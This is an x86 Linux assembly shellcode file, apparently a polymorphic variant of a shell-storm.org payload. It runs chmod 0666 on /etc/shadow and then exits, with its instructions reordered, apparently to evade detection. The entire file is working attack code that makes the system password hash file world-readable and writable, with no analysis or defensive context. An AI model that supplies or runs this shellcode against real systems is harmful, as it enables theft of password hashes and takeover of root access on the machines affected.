; chmod_etc_shadow.nasm
;  - Execute chmod 0666 /etc/shadow and exit
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-556.php

    global _start

section .text
_start:

	sub ebx,ebx		; xor eax,eax
	xchg eax,ebx		; ...
	push eax		

	push dword 0x776f6461	; woda
	inc ebx
	lea ebx, [ecx]
	push dword 0x68732f2f	; hs//
	push ecx
	add esp, 4
	push dword 0x6374652f	; cte/
	mov ebx,esp
	mov ecx, eax

	push word 0x1b6		
	pop ecx

	mov al,0x10		; chmod
	dec eax
	int 0x80

	mov al,0x1		; exit
	int 0x80
